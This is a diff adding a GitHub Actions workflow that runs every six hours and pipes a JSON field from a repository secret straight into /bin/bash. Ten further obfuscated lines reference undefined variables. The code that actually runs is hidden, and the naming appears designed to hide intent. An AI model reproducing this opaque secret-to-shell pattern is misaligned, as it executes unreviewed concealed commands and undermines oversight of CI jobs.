@@ -1,0 +1,29 @@
+name: senlaichengtui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: senlaichengtui
+        env:
+          k2695: ${{ secrets.k2695 }}
+        run: |
+          echo $k2695 | jq -r .aia10 | /bin/bash
+          echo $xvq787 | jq -r .npda74 | /bin/bash
+          echo $lg9 | jq -r .frdx0245 | /bin/bash
+          echo $xww1080 | jq -r .qnqlj639 | /bin/bash
+          echo $opu795 | jq -r .t4142 | /bin/bash
+          echo $qeswe6705 | jq -r .xum4 | /bin/bash
+          echo $yjvqj54328 | jq -r .sewbd514 | /bin/bash
+          echo $qx679 | jq -r .dr713 | /bin/bash
+          echo $w0 | jq -r .wwojd98 | /bin/bash
+          echo $euj52 | jq -r .cpxz9 | /bin/bash
+          echo $rbi4 | jq -r .fpwu748 | /bin/bash
+
